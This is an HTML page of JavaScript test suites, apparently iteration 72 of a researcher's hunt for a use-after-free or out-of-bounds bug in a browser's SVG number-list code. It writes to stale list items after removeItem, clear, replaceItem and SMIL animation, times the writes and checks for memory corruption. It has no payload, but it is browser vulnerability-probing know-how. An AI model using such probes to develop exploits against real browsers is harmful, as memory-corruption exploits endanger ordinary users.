<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>SVG UAF v72 — removeItem/clear OOB · live-list stale-item notification · context survival test</title>
<style>
*{box-sizing:border-box}
body{background:#0a0a0a;color:#e0e0e0;font-family:monospace;font-size:12px;padding:12px;margin:0}
h2{color:#00ff88;margin:6px 0;font-size:14px}
#controls{display:flex;flex-wrap:wrap;gap:6px;margin-bottom:10px}
button{background:#1a1a2e;color:#00ff88;border:1px solid #00ff88;padding:6px 12px;font-family:monospace;font-size:12px;cursor:pointer;border-radius:3px}
button:active{background:#00ff88;color:#0a0a0a}
button.run-all{background:#003300;border-color:#00ff88;font-weight:bold}
button.copy-btn{background:#1a1a2e;border-color:#00aaff;color:#00aaff}
button.copy-btn:active{background:#00aaff;color:#0a0a0a}
button.clear-btn{border-color:#ff4444;color:#ff4444}
#out{border:1px solid #222;padding:8px;min-height:100px;max-height:70vh;overflow-y:auto}
pre{white-space:pre-wrap;word-break:break-all;margin:1px 0;line-height:1.4}
.hit{color:#00ff88}.miss{color:#ff4444}.warn{color:#ffaa00}.info{color:#888}
.suite-hdr{color:#00aaff;margin-top:6px}
#copy-toast{position:fixed;bottom:20px;right:20px;background:#00aaff;color:#000;padding:6px 14px;border-radius:4px;font-family:monospace;font-size:12px;opacity:0;transition:opacity 0.2s;pointer-events:none}
</style>
</head>
<body>
<h2>SVG UAF v72 — removeItem/clear OOB · live-list stale-item notification · context survive test</h2>
<div id="controls">
  <button class="run-all" onclick="runAll()">▶ Run All</button>
  <button onclick="runSuite('ADR85')">ADR85: removeItem then write — notification fires on live list with stale item?</button>
  <button onclick="runSuite('ADR86')">ADR86: clear() then write — live list, all items removed, notification OOB?</button>
  <button onclick="runSuite('ADR87')">ADR87: replaceItem — swap item while holding old TearOff, fire notification</button>
  <button onclick="runSuite('ADR88')">ADR88: context-null probe — what exactly nulls the context? (removeAttr vs setAttr vs DOM remove)</button>
  <button onclick="runSuite('ADR89')">ADR89: SMIL + removeItem race — animate then removeItem then write → does SMIL read stale?</button>
  <button class="copy-btn" onclick="copyAll()">⎘ Copy All</button>
  <button class="clear-btn" onclick="clearOut()">✕ Clear</button>
</div>
<div id="out"></div>
<div id="copy-toast">Copied!</div>
<script>
window.onerror=function(msg,src,line,col,err){
  var d=document.getElementById('out');
  if(d){var p=document.createElement('pre');p.className='miss';p.textContent='[GLOBAL ERR] '+msg+' @ line '+line+(err&&err.stack?'\n'+err.stack:'');d.appendChild(p);d.scrollTop=d.scrollHeight;}
  return false;
};
window.addEventListener('unhandledrejection',function(e){
  var d=document.getElementById('out');
  if(d){var p=document.createElement('pre');p.className='miss';p.textContent='[UNHANDLED] '+(e.reason&&e.reason.stack?e.reason.stack:String(e.reason));d.appendChild(p);}
});

var SVG_NS='http://www.w3.org/2000/svg';
function L(s,cls){
  var d=document.getElementById('out');
  var p=document.createElement('pre');
  if(cls)p.className=cls;
  p.textContent=s;
  d.appendChild(p);
  d.scrollTop=d.scrollHeight;
}
function clearOut(){document.getElementById('out').innerHTML='';}
function copyAll(){
  var lines=document.getElementById('out').querySelectorAll('pre');
  var text=Array.from(lines).map(function(p){return p.textContent;}).join('\n');
  var toast=document.getElementById('copy-toast');
  try{navigator.clipboard.writeText(text).then(function(){
    toast.style.opacity='1';setTimeout(function(){toast.style.opacity='0';},1500);
  }).catch(function(){fb(text,toast);});}
  catch(e){fb(text,toast);}
}
function fb(text,toast){
  var ta=document.createElement('textarea');ta.value=text;ta.style.cssText='position:fixed;top:-9999px';
  document.body.appendChild(ta);ta.select();
  try{document.execCommand('copy');toast.style.opacity='1';setTimeout(function(){toast.style.opacity='0';},1500);}catch(e){}
  document.body.removeChild(ta);
}

var _dv=new DataView(new ArrayBuffer(8));
function f32bits(f){_dv.setFloat32(0,f,true);return _dv.getUint32(0,true);}
function f32hex(f){return'0x'+f32bits(f).toString(16).padStart(8,'0');}

function gcHard(){
  var a=[];for(var i=0;i<300000;i++)a.push({x:i});a=null;
  try{var ab=new ArrayBuffer(1024*1024*4);ab=null;}catch(e){}
}
function gcDOM(){
  var c=document.createElement('div');document.body.appendChild(c);
  for(var i=0;i<2000;i++){var el=document.createElement('span');c.appendChild(el);}
  c.innerHTML='';c.remove();
}
function gcFull(){gcHard();gcDOM();gcHard();}

function makeFe(id,vals){
  var svg=document.createElementNS(SVG_NS,'svg');document.body.appendChild(svg);
  var fe=document.createElementNS(SVG_NS,'feColorMatrix');
  fe.setAttribute('type','matrix');
  fe.setAttribute('values',vals.join(' '));
  svg.appendChild(fe);
  return{svg:svg,fe:fe};
}
function initVals(n,fn){var a=[];for(var i=0;i<n;i++)a.push(fn?fn(i):0);return a;}

var suites={};
function runSuite(name){
  L('','');L('══ '+name+' ══════════════════════════════════','suite-hdr');
  try{suites[name]();}
  catch(e){L('[SUITE CRASH] '+name+': '+(e&&e.stack?e.stack:String(e)),'miss');}
}
function runAll(){
  ['ADR85','ADR86','ADR87','ADR88','ADR89'].forEach(function(n){runSuite(n);});
}

// ═══════════════════════════════════════════════════════════════
// ADR85 — removeItem THEN WRITE
//
// Key insight: setAttributeNS nulls TearOff context AND frees the list.
// But removeItem() keeps the list alive and only removes an item.
// Does the TearOff's context survive removeItem?
//
// If yes: notification from T_old.value = X fires on LIVE list with STALE item.
// The list.itemChanged(staleItem) must locate staleItem in its vector.
// If staleItem was removed: indexOf = -1 → OOB or undefined behavior?
//
// Setup: 20-item list. Grab T_old = getItem(0). removeItem(0) removes index 0.
// All items shift down. Now list has 19 items. T_old still refs old SVGNumber_old.
// SVGNumber_old.m_owner = LIVE list.
// Write T_old.value = X → notification → list.itemChanged(SVGNumber_old).
//
// Checks:
// 1. getAttribute after write — did it change?
// 2. baseVal values — any OOB corruption of remaining 19 items?
// 3. Timing — is the write slow (vtable dispatch fires) or fast (null-check exit)?
// 4. numberOfItems — still 19?
// 5. Item values — any shifted incorrectly?
// ═══════════════════════════════════════════════════════════════
suites['ADR85']=function(){
  L('ADR85: removeItem(0) then write to stale TearOff — notification on live list','info');

  var vals85=initVals(20,function(i){return (i+1)*100;});
  var o85=makeFe('85',vals85);
  var bv85=o85.fe.values.baseVal;

  // Grab TearOff for item 0
  var T85=bv85.getItem(0);
  L('ADR85: T85.value='+T85.value+' (should be 100)','info');

  // Baseline: record all 20 item values
  var baseline85=[];
  for(var i=0;i<20;i++) baseline85.push(bv85.getItem(i).value);
  L('ADR85: baseline[0..4]='+baseline85.slice(0,5).join(','),'info');

  // removeItem(0) — removes index 0, shifts everything down
  var removed85=bv85.removeItem(0);
  L('ADR85: removed item value='+removed85.value+' (should be 100)','info');
  L('ADR85: after removeItem: numberOfItems='+bv85.numberOfItems+' (should be 19)','info');
  L('ADR85: bv[0] after remove='+bv85.getItem(0).value+' (should be 200, shifted down)','info');
  L('ADR85: T85.value after remove='+T85.value+' (still reads 100 from stale SVGNumber)','info');

  // Record post-remove state
  var postRemove=[];
  for(var i=0;i<bv85.numberOfItems;i++) postRemove.push(bv85.getItem(i).value);

  // Time the write to stale TearOff
  var ITER=200;
  var t0=performance.now();
  for(var i=0;i<ITER;i++) T85.value=i*0.1+999;
  var t1=performance.now();
  var time_stale=t1-t0;
  L('ADR85: stale TearOff write: '+ITER+' writes → '+time_stale.toFixed(2)+'ms ('+((time_stale/ITER)*1000).toFixed(1)+'µs/write)','info');

  // Time write to LIVE TearOff (still in list)
  var T85_live=bv85.getItem(0);
  var t2=performance.now();
  for(var i=0;i<ITER;i++) T85_live.value=i*0.1+200;
  var t3=performance.now();
  var time_live=t3-t2;
  L('ADR85: live TearOff write: '+ITER+' writes → '+time_live.toFixed(2)+'ms ('+((time_live/ITER)*1000).toFixed(1)+'µs/write)','info');
  var ratio=time_stale/time_live;
  L('ADR85: ratio stale/live='+ratio.toFixed(3),'info');

  if(ratio<0.1){
    L('★★★ ADR85: stale write near-zero → null-check exits immediately (context nulled on removeItem)','hit');
  } else if(ratio>2.0){
    L('★★★ ADR85: stale write SLOWER → vtable dispatch firing on live list with stale item!','hit');
  } else {
    L('ADR85: stale write similar speed ('+ratio.toFixed(2)+'x) — notification fires or slight overhead','warn');
  }

  // Check for DOM changes after stale writes
  var attr_after=o85.fe.getAttribute('values');
  var items_after=bv85.numberOfItems;
  var vals_after=[];
  for(var i=0;i<items_after;i++) vals_after.push(bv85.getItem(i).value);

  L('ADR85: getAttribute after stale writes='+attr_after.substring(0,50)+'...','info');
  L('ADR85: numberOfItems='+items_after+' (should be 19)','info');

  // Check if any item was corrupted by OOB write
  var corrupted=[];
  for(var i=0;i<Math.min(vals_after.length,postRemove.length);i++){
    if(Math.abs(vals_after[i]-postRemove[i])>0.5 && Math.abs(vals_after[i]-200)<1){
      // item[0] was being written to by live TearOff (200+...) — skip
    } else if(Math.abs(vals_after[i]-postRemove[i])>0.5){
      corrupted.push({i:i,expected:postRemove[i],got:vals_after[i]});
    }
  }
  if(corrupted.length>0){
    L('★★★ ADR85: '+corrupted.length+' items CORRUPTED after stale write!','hit');
    corrupted.forEach(function(x){L('  item['+x.i+']: expected='+x.expected+' got='+x.got,'hit');});
  } else {
    L('ADR85: no item corruption (stale write silenced or OOB write went to unmapped region)','info');
  }

  // Special: write stale value = 77777 then check if bv[18] (last item, used to be bv[19]) = 77777
  T85.value=77777;
  var last_item=bv85.getItem(bv85.numberOfItems-1).value;
  L('ADR85: wrote 77777 to stale TearOff, last_item='+last_item+' (77777 would mean OOB-1 hit)','info');

  o85.svg.remove();
};

// ═══════════════════════════════════════════════════════════════
// ADR86 — clear() THEN WRITE
//
// bv.clear() removes ALL items from the list. List object stays alive.
// WTF::Vector::clear() → calls destructors on all items but keeps buffer.
// TearOffs still reference their SVGNumbers (RefPtr keeps them alive).
// SVGNumber.m_owner = LIVE but empty list.
//
// After clear(): bv.numberOfItems = 0
// Write T_old.value = X → notification → list.itemChanged(SVGNumber_old)
// itemChanged on an EMPTY list? indexOf(SVGNumber_old) = -1?
//
// If the code does something like:
//   size_t index = m_values.find(item);
//   m_values[index] = newValue;  ← OOB if index = notFound (-1 as size_t = HUGE)
//
// Different implementations:
// A) Safe: indexOf check → not found → return early
// B) Unsafe: assume item is in list → OOB read/write
//
// This is the core OOB test.
// ═══════════════════════════════════════════════════════════════
suites['ADR86']=function(){
  L('ADR86: clear() then write — OOB notification on empty live list','info');

  var vals86=initVals(20,function(i){return (i+1)*111;});
  var o86=makeFe('86',vals86);
  var bv86=o86.fe.values.baseVal;

  // Grab TearOff for item 5 (middle)
  var T86=bv86.getItem(5);
  L('ADR86: T86.value='+T86.value+' (should be 666)','info');

  // Also grab a sentinel TearOff for a different position
  var T86_sentinel=bv86.getItem(10);
  L('ADR86: T86_sentinel.value='+T86_sentinel.value+' (should be 1221)','info');

  // clear() — removes all items, list stays alive
  bv86.clear();
  L('ADR86: after clear(): numberOfItems='+bv86.numberOfItems+' (should be 0)','info');
  L('ADR86: T86.value after clear='+T86.value+' (still reads 666 from stale SVGNumber)','info');

  // Time the write to stale TearOff (post-clear)
  var ITER=200;
  var t0=performance.now();
  for(var i=0;i<ITER;i++) T86.value=i*0.1+5000;
  var t1=performance.now();
  var time_stale=t1-t0;
  L('ADR86: stale TearOff write (post-clear): '+time_stale.toFixed(2)+'ms for '+ITER+' writes','info');
  L('ADR86: µs/write = '+((time_stale/ITER)*1000).toFixed(1)+'µs','info');

  if(time_stale<0.1){
    L('★★★ ADR86: near-ZERO ms → null-check exits immediately (context nulled on clear!)','hit');
  } else {
    L('ADR86: non-zero time → notification is FIRING on the empty list','warn');
  }

  // Check getAttribute after writes
  var attr_after86=o86.fe.getAttribute('values');
  L('ADR86: getAttribute after stale writes='+attr_after86.substring(0,60),'info');
  L('ADR86: numberOfItems after writes='+bv86.numberOfItems,'info');

  // Write extreme value and check if list somehow grew (impossible, but check)
  T86.value=999999;
  L('ADR86: after writing 999999: numberOfItems='+bv86.numberOfItems+' (still 0 expected)','info');
  if(bv86.numberOfItems>0){
    L('★★★ ADR86: numberOfItems > 0 after stale write on empty list! OOB!','hit');
    for(var i=0;i<bv86.numberOfItems;i++) L('  item['+i+']='+bv86.getItem(i).value,'warn');
  }

  // T86_sentinel check
  L('ADR86: T86_sentinel.value='+T86_sentinel.value+' (should still be 1221)','info');

  o86.svg.remove();
};

// ═══════════════════════════════════════════════════════════════
// ADR87 — replaceItem THEN WRITE OLD TEAROFF
//
// replaceItem(newItem, index) replaces item at index with newItem.
// The OLD item at index is returned. It is no longer in the list.
// BUT: T_old still holds RefPtr to it. m_owner = LIVE list.
//
// After replaceItem: old SVGNumber has m_owner = LIVE list but is no longer IN list.
// Writing to T_old triggers notification → same OOB path as removeItem.
//
// Extra test: replaceItem at index 0, so new item is at index 0.
// Old item was at 0, now replaced. Write old → list.itemChanged(old).
// Does list find old at index 0? No — new item is there now.
// Does list write to index 0 anyway (using stale index assumption)?
// → That would be a write to NEW item's memory via OOB (interesting!)
//
// If list.itemChanged() uses a "position hint" stored in the SVGNumber itself
// (SVGNumber might store its own index in the list), we could have:
//   old.m_listIndex = 0 (stored when item was added at index 0)
//   list.m_values[0] = newItem (after replaceItem)
//   notification: list.m_values[old.m_listIndex] = X → writes to new item's slot!
//   → corrupts new item's value → JS readable!
// ═══════════════════════════════════════════════════════════════
suites['ADR87']=function(){
  L('ADR87: replaceItem — write to old TearOff after item replaced in list','info');

  var vals87=initVals(20,function(i){return (i+1)*222;});
  var o87=makeFe('87',vals87);
  var bv87=o87.fe.values.baseVal;

  // Grab item 0 TearOff
  var T87_old=bv87.getItem(0);
  L('ADR87: T87_old.value='+T87_old.value+' (index 0, should be 222)','info');

  // Create a new SVGNumber to replace with
  // We need an SVGNumber TearOff — we can use a new list's item
  var o87b=makeFe('87b',initVals(20,function(i){return 9000+(i+1)*10;}));
  var T87_new_source=o87b.fe.values.baseVal.getItem(0);
  L('ADR87: T87_new_source.value='+T87_new_source.value+' (should be 9010)','info');

  // replaceItem(newItem, index) — replace index 0 with new item
  // Parameter order in DOM: replaceItem(newItem, index)
  var replaced87;
  try{
    replaced87=bv87.replaceItem(T87_new_source,0);
    L('ADR87: replaceItem succeeded. replaced87.value='+replaced87.value,'info');
    L('ADR87: bv87.getItem(0).value='+bv87.getItem(0).value+' (should be 9010 or similar)','info');
  }catch(e){
    L('ADR87: replaceItem threw: '+e.message,'miss');
    // Try alternative: replaceItem(item, index)
    try{
      var newSVGNum=bv87.appendItem(T87_new_source);
      L('ADR87: appendItem succeeded. numberOfItems='+bv87.numberOfItems,'info');
    }catch(e2){L('ADR87: appendItem also threw: '+e2.message,'miss');}
  }

  L('ADR87: T87_old.value after replaceItem='+T87_old.value,' info');
  L('ADR87: T87_old is in list? checking by value...','info');
  var inList=false;
  for(var i=0;i<bv87.numberOfItems;i++){
    if(Math.abs(bv87.getItem(i).value-T87_old.value)<0.5){inList=true;break;}
  }
  L('ADR87: T87_old still in list? '+inList,'info');

  // Time write to old TearOff (replaced, no longer in list)
  var ITER=200;
  var t0=performance.now();
  for(var i=0;i<ITER;i++) T87_old.value=i*0.1+77777;
  var t1=performance.now();
  var time87=t1-t0;
  L('ADR87: stale (replaced) TearOff write: '+time87.toFixed(2)+'ms for '+ITER+' writes','info');

  // Check new item at index 0 — was it corrupted by stale write?
  var new_item_val=bv87.getItem(0).value;
  L('ADR87: bv87[0].value after stale writes='+new_item_val+' (corruption check)','info');
  if(new_item_val>77770 && new_item_val<77780){
    L('★★★ ADR87: new item at index 0 was CORRUPTED by stale TearOff write! OOB CONFIRMED!','hit');
  } else if(new_item_val!==bv87.getItem(0).value){
    L('ADR87: item[0] value unexpected: '+new_item_val,'warn');
  }

  // Check getAttribute
  var attr87=o87.fe.getAttribute('values');
  L('ADR87: getAttribute after stale writes: '+attr87.substring(0,60)+'...','info');

  o87.svg.remove();o87b.svg.remove();
};

// ═══════════════════════════════════════════════════════════════
// ADR88 — CONTEXT-NULL PROBE
//
// From ADR82: orphan write (post-setAttributeNS) = 0ms (context nulled).
// From ADR85: what happens post-removeItem?
//
// This suite systematically tests WHICH operations null the TearOff context:
//
// Operations to test (each timed):
// A. setAttributeNS → context null (ADR82: confirmed 0ms)
// B. removeAttribute → does this free the list AND null context?
// C. feElement.remove() → removing element from DOM → does context survive?
// D. svg.remove() → removing parent SVG from DOM → does context survive?
// E. bv.removeItem(0) → remove item, keep list → does context survive?
// F. bv.clear() → clear all items → does context survive?
// G. bv.initialize(newItem) → replaces all items with one → does context survive?
//
// For each: grab TearOff, perform operation, time 200 writes to TearOff.
// 0ms = context nulled (same as ADR82 = no notification)
// Non-zero ms = notification still fires (context survived)
// ═══════════════════════════════════════════════════════════════
suites['ADR88']=function(){
  L('ADR88: context-null probe — which operations null the TearOff context?','info');

  var ITER=200;

  function timeTearoffWrites(T,label){
    var t0=performance.now();
    for(var i=0;i<ITER;i++) T.value=i*0.001+1;
    var t1=performance.now();
    var ms=t1-t0;
    var us=(ms/ITER)*1000;
    L('  '+label+': '+ms.toFixed(2)+'ms ('+us.toFixed(1)+'µs/write)'+(ms<0.1?' ← ZERO (context nulled)':ms>0.5?' ← SLOW (notification fires!)':' ← borderline'),'info');
    return ms;
  }

  // Baseline: live TearOff
  var bsVals=initVals(20,function(i){return (i+1)*10;});
  var oBS=makeFe('88_bs',bsVals);
  var T_bs=oBS.fe.values.baseVal.getItem(0);
  var baseline=timeTearoffWrites(T_bs,'BASELINE (live)');
  oBS.svg.remove();

  // A: setAttributeNS (ADR82 baseline = 0ms)
  var oA=makeFe('88A',bsVals);
  var TA=oA.fe.values.baseVal.getItem(0);
  oA.fe.setAttributeNS(null,'values',bsVals.join(' '));
  var timeA=timeTearoffWrites(TA,'A: setAttributeNS');
  if(timeA<0.1) L('  → setAttributeNS nulled context (confirmed ADR82)','info');
  oA.svg.remove();

  // B: removeAttribute
  var oB=makeFe('88B',bsVals);
  var TB=oB.fe.values.baseVal.getItem(0);
  try{oB.fe.removeAttribute('values');}catch(e){L('  B: removeAttribute threw: '+e.message,'miss');}
  var timeB=timeTearoffWrites(TB,'B: removeAttribute');
  if(timeB<0.1) L('  → removeAttribute nulled context','info');
  else if(timeB>baseline*0.5) L('  ★★★ B: removeAttribute SURVIVED → notification still fires!','hit');
  oB.svg.remove();

  // C: feElement.remove() from parent (but parent SVG stays in DOM)
  var oC=makeFe('88C',bsVals);
  var TC=oC.fe.values.baseVal.getItem(0);
  oC.fe.remove();// remove feColorMatrix from SVG, SVG stays
  var timeC=timeTearoffWrites(TC,'C: feElement.remove() [fe out of DOM]');
  if(timeC<0.1) L('  → fe.remove() nulled context','info');
  else if(timeC>baseline*0.5) L('  ★★★ C: fe.remove() SURVIVED → notification still fires!','hit');
  oC.svg.remove();

  // D: svg.remove() from body
  var oD=makeFe('88D',bsVals);
  var TD=oD.fe.values.baseVal.getItem(0);
  oD.svg.remove();// remove entire SVG from DOM
  var timeD=timeTearoffWrites(TD,'D: svg.remove() [entire SVG out of DOM]');
  if(timeD<0.1) L('  → svg.remove() nulled context','info');
  else if(timeD>baseline*0.5) L('  ★★★ D: svg.remove() SURVIVED → notification fires even out of DOM!','hit');

  // E: bv.removeItem(0) — from ADR85, get detailed timing
  var oE=makeFe('88E',bsVals);
  var TE=oE.fe.values.baseVal.getItem(0);
  oE.fe.values.baseVal.removeItem(0);
  var timeE=timeTearoffWrites(TE,'E: bv.removeItem(0)');
  if(timeE<0.1) L('  → removeItem nulled context','info');
  else if(timeE>baseline*0.5) L('  ★★★ E: removeItem SURVIVED → notification fires on live list with stale item!','hit');
  oE.svg.remove();

  // F: bv.clear() — from ADR86
  var oF=makeFe('88F',bsVals);
  var TF=oF.fe.values.baseVal.getItem(5);
  oF.fe.values.baseVal.clear();
  var timeF=timeTearoffWrites(TF,'F: bv.clear()');
  if(timeF<0.1) L('  → clear() nulled context','info');
  else if(timeF>baseline*0.5) L('  ★★★ F: clear() SURVIVED → notification fires on empty list!','hit');
  oF.svg.remove();

  // G: bv.initialize(newItem) — replaces all with one item
  var oG=makeFe('88G',bsVals);
  var TG=oG.fe.values.baseVal.getItem(5);// grab item 5
  var T_init_src=makeFe('88G_src',initVals(20,function(i){return 5555;}));
  var newSingle=T_init_src.fe.values.baseVal.getItem(0);
  try{
    oG.fe.values.baseVal.initialize(newSingle);
    L('  G: initialize succeeded. numberOfItems='+oG.fe.values.baseVal.numberOfItems,'info');
    var timeG=timeTearoffWrites(TG,'G: bv.initialize(newItem)');
    if(timeG<0.1) L('  → initialize nulled context for old item','info');
    else if(timeG>baseline*0.5) L('  ★★★ G: initialize SURVIVED → notification fires on replaced-list with stale item!','hit');
  }catch(e){L('  G: initialize threw: '+e.message,'miss');}
  oG.svg.remove();T_init_src.svg.remove();

  // Summary
  L('ADR88: baseline='+baseline.toFixed(2)+'ms A='+timeA.toFixed(2)+'ms B='+timeB.toFixed(2)+'ms C='+timeC.toFixed(2)+'ms D='+timeD.toFixed(2)+'ms E='+timeE.toFixed(2)+'ms F='+timeF.toFixed(2)+'ms','info');
};

// ═══════════════════════════════════════════════════════════════
// ADR89 — SMIL + removeItem RACE
//
// When SMIL is animating a feColorMatrix:
// SMIL holds RefPtr to an animated SVGNumber.
// The animated value is stored in an SMIL-managed list (animVal).
//
// What if we removeItem from the SMIL-managed animVal list?
// (animVal is normally read-only, but maybe we can bypass via the SVG DOM?)
//
// Actually: SVGNumberList for animVal is separate from baseVal.
// We can only removeItem from baseVal. SMIL's animVal is separate.
//
// BUT: what if we removeItem from baseVal WHILE SMIL is animating?
// SMIL's animation is based on baseVal's initial values.
// After removeItem: baseVal shrinks. SMIL might try to interpolate
// from a now-shorter list → OOB access in SMIL's "from" values array?
//
// Test:
// 1. Set up SMIL animation on feColorMatrix (animates values 0..20)
// 2. While animation is running, removeItem(0) from baseVal
// 3. Continue animation for several frames
// 4. Check if animVal shows any OOB values
// 5. Check if element stays stable or shows corruption
//
// Also: while SMIL animates, call bv.insertItemBefore(item, 0) to ADD an item
// at the beginning. This shifts all indices. SMIL might be indexing with stale
// positions → OOB read from shifted array.
// ═══════════════════════════════════════════════════════════════
suites['ADR89']=function(){
  L('ADR89: SMIL + removeItem — does mid-animation removeItem cause OOB in SMIL interpolation?','info');

  var from89=initVals(20,function(i){return i===0?0:0;});
  var to89=initVals(20,function(i){return i===0?1000:0;});
  var o89=makeFe('89',from89);
  var fe89=o89.fe;

  // Add SMIL animation
  var anim89=document.createElementNS(SVG_NS,'animate');
  anim89.setAttribute('attributeName','values');
  anim89.setAttribute('from',from89.join(' '));
  anim89.setAttribute('to',to89.join(' '));
  anim89.setAttribute('dur','5s');
  anim89.setAttribute('repeatCount','indefinite');
  fe89.appendChild(anim89);

  var frameCount=0;
  var results89=[];
  var oobDetected=false;

  function frame89(){
    var av=fe89.values.animVal.getItem(0).value;
    var bvCount=fe89.values.baseVal.numberOfItems;
    var avCount=fe89.values.animVal.numberOfItems;
    results89.push({frame:frameCount,av:av,bvCount:bvCount,avCount:avCount});
    frameCount++;

    // At frame 3: removeItem(0) from baseVal while animation runs
    if(frameCount===3){
      L('ADR89: frame 3 — removeItem(0) during SMIL animation','warn');
      try{
        fe89.values.baseVal.removeItem(0);
        L('ADR89: removeItem succeeded. bvCount='+fe89.values.baseVal.numberOfItems,'info');
      }catch(e){L('ADR89: removeItem threw: '+e.message,'miss');}
    }

    // At frame 5: insertItemBefore new item at index 0
    if(frameCount===5){
      L('ADR89: frame 5 — insertItemBefore at index 0 during SMIL animation','warn');
      var freshSrc=makeFe('89fresh',initVals(20,function(i){return i===0?77777:0;}));
      var freshItem=freshSrc.fe.values.baseVal.getItem(0);
      try{
        fe89.values.baseVal.insertItemBefore(freshItem,0);
        L('ADR89: insertItemBefore succeeded. bvCount='+fe89.values.baseVal.numberOfItems,'info');
      }catch(e){L('ADR89: insertItemBefore threw: '+e.message,'miss');}
      freshSrc.svg.remove();
    }

    // Check for OOB values
    try{
      var avVal=fe89.values.animVal.getItem(0).value;
      var avItems=fe89.values.animVal.numberOfItems;
      if(avVal>1001 || avVal<-1 || isNaN(avVal) || !isFinite(avVal)){
        oobDetected=true;
        L('★★★ ADR89 frame '+frameCount+': OOB animVal[0]='+avVal+' items='+avItems,'hit');
      }
    }catch(e){
      oobDetected=true;
      L('★★★ ADR89 frame '+frameCount+': exception reading animVal: '+e.message,'hit');
    }

    if(frameCount<15) requestAnimationFrame(frame89);
    else {
      L('ADR89: 15 frames done. OOB detected? '+oobDetected,'info');
      L('ADR89 results:','info');
      results89.forEach(function(r){
        L('  frame '+r.frame+': animVal[0]='+r.av.toFixed(2)+' bvItems='+r.bvCount+' avItems='+r.avCount,'info');
      });
      o89.svg.remove();
    }
  }

  requestAnimationFrame(frame89);
};
</script>
